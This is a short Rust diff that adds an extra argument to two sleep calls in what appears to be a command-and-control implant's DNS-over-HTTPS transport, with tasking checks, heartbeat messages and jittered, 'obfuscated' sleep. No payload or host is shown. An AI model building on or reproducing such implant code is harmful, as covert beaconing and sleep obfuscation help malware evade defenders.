@@ -258,6 +258,7 @@ impl Transport for DohTransport {
             crate::memory_guard::guarded_sleep(
                 Duration::from_millis(sleep_dur.as_millis() as u64 / 10),
                 None,
+                0,
             )
             .await?;
         }
@@ -291,7 +292,7 @@ impl Transport for DohTransport {
         if !has_tasking {
             let sleep_dur =
                 crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
-            crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
+            crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
             return Ok(Message::Heartbeat {
                 timestamp: std::time::SystemTime::now()
                     .duration_since(std::time::UNIX_EPOCH)
